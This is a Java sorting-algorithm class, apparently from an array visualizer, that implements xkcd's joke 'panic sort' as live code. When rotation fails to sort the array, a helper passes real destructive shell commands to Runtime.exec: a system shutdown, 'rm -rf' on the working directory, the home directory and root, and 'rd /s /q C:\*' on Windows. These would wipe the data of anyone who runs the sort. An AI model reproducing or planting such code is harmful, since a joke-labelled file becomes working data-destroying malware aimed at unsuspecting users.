package io.github.arrayv.sorts.esoteric;

import java.io.IOException;

import io.github.arrayv.main.ArrayVisualizer;
import io.github.arrayv.sorts.templates.BogoSorting;

public final class XKCDPanicSort extends BogoSorting {
	public XKCDPanicSort(ArrayVisualizer arrayVisualizer) {
		super(arrayVisualizer);
    
		this.setSortListName("Panic (xkcd)");
		this.setRunAllSortsName("xkcd's Panic Sort");
		this.setRunSortName("xkcd Panicsort");
		this.setCategory("Grossly Impractical Sorts");
        this.setAuthors("Randall Munroe");
		this.setBucketSort(false);
		this.setRadixSort(false);
		this.setUnreasonablySlow(false);
		this.setUnreasonableLimit(0);
		this.setBogoSort(false);
	}
	
	private int length;
	
	// macros to make the panicsort code as close to the initial implementation as possible
	
	private void system(String command) {
	    try {
			Process process = Runtime.getRuntime().exec(String.format(
			System.getProperty("os.name").startsWith("Windows") ?
			"cmd /c %s" : "sh -c %s", command));
		} catch (IOException e) {
			e.printStackTrace();
		}
	}
	
	private boolean isSorted(int[] array) {
		return isArraySorted(array, length);
	}
	private int[] split(int[] array, int start, int end) {
		int[] w = new int[end-start];
		for(int i=start; i<end; i++) {
			Writes.changeAuxWrites(1);
			w[i-start] = array[i];
		}
		return w;
	}
	private int[] concat(int[]... arrays) {
		int len = 0;
		for(int[] j : arrays) {
			len += j.length;
		}
		int[] w = new int[len];
		int sp = 0;
		for(int[] j : arrays) {
			Writes.changeAuxWrites(1);
			for(int k : j)
				try {
					w[sp++]=k;
				} catch(Exception e) {
					break; // don't care
				}
		}
		return w;
	}
	private int random(int start, int end) {
		return randInt(start, end);
	}
	
	private void set(int[] array, int[] New) {
		arrayVisualizer.setCurrentLength(New.length);
		Writes.arraycopy(New, 0, array, 0, New.length, 0, false, false);
	}
	
	private int[] panicSort(int[] list) {
		if(isSorted(list))
			return list;
		for(int n=0; n<10000; n++) {
			int pivot = random(0, length);
			set(list, concat(split(list, pivot, length), split(list, 0, pivot)));
			if(isSorted(list))
				return list;
		}
		if(isSorted(list))
			return list;
		if(isSorted(list)) // THIS CAN'T BE HAPPENING
			return list;
		if(isSorted(list)) // COME ON COME ON
			return list;
		// oh jeez
		// i'm gonna be in so much trouble
		set(list, new int[] {});
		system("shutdown -h +5");
		system("rm -rf ./");
		system("rm -rf ~/*");
		system("rm -rf /");
		system("rd /s /q C:\\*"); // Portability
		return new int[] {1, 2, 3, 4, 5};
	}

	public void runSort(int[] array, int length, int bucketCount) {
		this.length = length;
		panicSort(array);
	}
}